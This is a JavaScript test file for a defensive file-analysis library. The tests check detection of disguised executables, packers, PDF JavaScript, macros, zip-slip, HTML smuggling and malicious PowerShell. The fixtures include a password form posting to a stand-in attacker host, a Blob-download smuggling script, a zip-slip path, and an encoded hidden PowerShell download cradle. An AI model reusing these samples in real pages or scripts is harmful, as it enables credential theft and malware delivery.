import { test } from "node:test";
import assert from "node:assert/strict";
import { zipSync, strToU8 } from "fflate";
import {
  analyzeFile, detectType, analyzeName, parseZipEntries, classifyZip, byteEntropy, parsePE, pdfKeywordCounts, extractIOCs, parseExif,
} from "../../src/lib/file-analysis.js";

const enc = (s) => new TextEncoder().encode(s);
const ids = (report) => report.findings.map((f) => f.id);

function fakePE({ sections = [[".text", 0x60000020], [".data", 0xc0000040]], dll = false } = {}) {
  const buf = new Uint8Array(4096);
  const v = new DataView(buf.buffer);
  buf[0] = 0x4d; buf[1] = 0x5a; // MZ
  v.setUint32(0x3c, 0x80, true);
  v.setUint32(0x80, 0x00004550, true); // PE\0\0
  v.setUint16(0x84, 0x8664, true); // x64
  v.setUint16(0x86, sections.length, true);
  v.setUint32(0x88, 1700000000, true);
  v.setUint16(0x94, 0xf0, true); // optional header size
  v.setUint16(0x96, dll ? 0x2022 : 0x0022, true);
  v.setUint16(0x98, 0x20b, true); // PE32+
  v.setUint16(0x98 + 68, 2, true); // GUI
  v.setUint16(0x98 + 70, 0x0140, true); // ASLR + DEP
  let off = 0x98 + 0xf0;
  sections.forEach(([name, chars], i) => {
    for (let j = 0; j < name.length; j++) buf[off + j] = name.charCodeAt(j);
    v.setUint32(off + 8, 0x200, true);
    v.setUint32(off + 16, 0x200, true);
    v.setUint32(off + 20, 0x400 + i * 0x200, true);
    v.setUint32(off + 36, chars, true);
    off += 40;
  });
  return buf;
}

test("detects real types from magic bytes", () => {
  assert.equal(detectType(enc("%PDF-1.7\n")).type, "pdf");
  assert.equal(detectType(new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0, 0, 0, 0])).type, "png");
  assert.equal(detectType(fakePE()).type, "pe");
  assert.equal(detectType(enc("<!DOCTYPE html><html>")).type, "html");
  assert.equal(detectType(enc("<svg xmlns='http://www.w3.org/2000/svg'></svg>")).type, "svg");
  assert.equal(detectType(enc("#!/bin/sh\necho hi")).type, "script");
  assert.equal(detectType(new Uint8Array([0x4c, 0, 0, 0, 1, 0x14, 2, 0, 0, 0])).type, "lnk");
});

test("flags deceptive names", () => {
  assert.ok(analyzeName("invoice.pdf.exe").findings.some((f) => f.id === "double-extension" && f.severity === "critical"));
  assert.ok(analyzeName("invoice‮fdp.exe").findings.some((f) => f.id === "bidi-override"));
  assert.ok(analyzeName("report.docm").findings.some((f) => f.id === "macro-extension"));
  assert.equal(analyzeName("holiday.jpg").findings.length, 0);
});

test("executable disguised as a PDF is critical", () => {
  const r = analyzeFile({ name: "statement.pdf", bytes: fakePE() });
  assert.ok(ids(r).includes("type-mismatch"));
  assert.equal(r.findings.find((f) => f.id === "type-mismatch").severity, "critical");
  assert.equal(r.verdict.level, "critical");
});

test("parses PE headers and spots packers", () => {
  const pe = parsePE(fakePE({ sections: [["UPX0", 0xe0000080], ["UPX1", 0xe0000040]], dll: true }));
  assert.equal(pe.machine, "x64");
  assert.equal(pe.isDll, true);
  assert.equal(pe.sections[0].name, "UPX0");
  const r = analyzeFile({ name: "lib.dll", bytes: fakePE({ sections: [["UPX0", 0xe0000080]] }) });
  assert.ok(ids(r).includes("packer-sections"));
  assert.ok(ids(r).includes("wx-sections"));
});

test("PDF with JavaScript and auto-actions", () => {
  const pdf = enc("%PDF-1.4\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n2 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj\n%%EOF");
  const counts = pdfKeywordCounts(pdf).counts;
  assert.equal(counts["/JavaScript"], 1);
  assert.equal(counts["/JS"], 1);
  const r = analyzeFile({ name: "doc.pdf", bytes: pdf });
  assert.ok(ids(r).includes("pdf-javascript"));
  assert.equal(r.findings.find((f) => f.id === "pdf-auto-action").severity, "high");
});

test("Office document with VBA macros (OOXML)", () => {
  const zip = zipSync({
    "[Content_Types].xml": strToU8("<Types/>"),
    "word/document.xml": strToU8("<w:document/>"),
    "word/vbaProject.bin": new Uint8Array([1, 2, 3]),
  });
  const { entries } = parseZipEntries(zip);
  assert.equal(entries.length, 3);
  assert.equal(classifyZip(entries).kind, "docx");
  const r = analyzeFile({ name: "invoice.docx", bytes: zip });
  assert.ok(ids(r).includes("vba-macros"));
});

test("archive with executable and path traversal", () => {
  const zip = zipSync({ "../../evil.txt": strToU8("x"), "setup.exe": fakePE() });
  const r = analyzeFile({ name: "files.zip", bytes: zip });
  assert.ok(ids(r).includes("zip-slip"));
  assert.ok(ids(r).includes("archived-executable"));
});

test("HTML smuggling and credential phishing attachments", () => {
  const html = enc(`<html><body><form action="https://evil.example/collect"><input type="password"></form>
    <script>const b=new Blob([atob("TVqQ")]);const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='x.exe';a.click();</script></body></html>`);
  const r = analyzeFile({ name: "Invoice.html", bytes: html });
  for (const id of ["html-smuggling", "credential-form", "remote-form", "html-script", "web-attachment"]) assert.ok(ids(r).includes(id), id);
  assert.ok(["high", "critical"].includes(r.verdict.level));
});

test("malicious PowerShell patterns", () => {
  const ps = enc("powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==");
  const r = analyzeFile({ name: "update.ps1", bytes: ps });
  assert.ok(r.findings.some((f) => f.title === "Encoded PowerShell command"));
  assert.ok(r.findings.some((f) => f.title === "Hidden / policy-bypassing PowerShell"));
});

test("benign text file is low risk", () => {
  const r = analyzeFile({ name: "notes.txt", bytes: enc("Shopping list:\n- milk\n- bread\n") });
  assert.equal(r.verdict.level, "low");
  assert.equal(r.findings.length, 0);
});

test("entropy", () => {
  assert.equal(byteEntropy(new Uint8Array(1000)), 0);
  const rnd = new Uint8Array(65536);
  crypto.getRandomValues(rnd);
  assert.ok(byteEntropy(rnd) > 7.9);
});

test("IOC extraction skips version numbers and common schema hosts", () => {
  const iocs = extractIOCs(["http://203.0.113.50/payload.bin", "1.0.0.0", "http://schemas.openxmlformats.org/x", "contact admin@evil-c2.ru"]);
  assert.deepEqual(iocs.urls, ["http://203.0.113.50/payload.bin"]);
  assert.ok(iocs.ips.includes("203.0.113.50"));
  assert.ok(!iocs.ips.includes("1.0.0.0"));
  assert.ok(iocs.emails.includes("admin@evil-c2.ru"));
});

test("EXIF GPS detection", () => {
  // Minimal JPEG with an EXIF APP1 containing a GPS IFD pointer and Make tag.
  const tiff = [0x49, 0x49, 0x2a, 0x00, 8, 0, 0, 0, 2, 0,
    0x0f, 0x01, 2, 0, 4, 0, 0, 0, 0x41, 0x43, 0x4d, 0x00, // Make = "ACM"
    0x25, 0x88, 4, 0, 1, 0, 0, 0, 0, 0, 0, 0, // GPSInfo pointer
    0, 0, 0, 0];
  const app1 = [0xff, 0xe1, 0, 8 + tiff.length, ...enc("Exif\0\0"), ...tiff];
  const jpeg = new Uint8Array([0xff, 0xd8, ...app1, 0xff, 0xda, 0, 2]);
  const exif = parseExif(jpeg);
  assert.equal(exif.Make, "ACM");
  assert.match(exif.GPS, /present/);
});
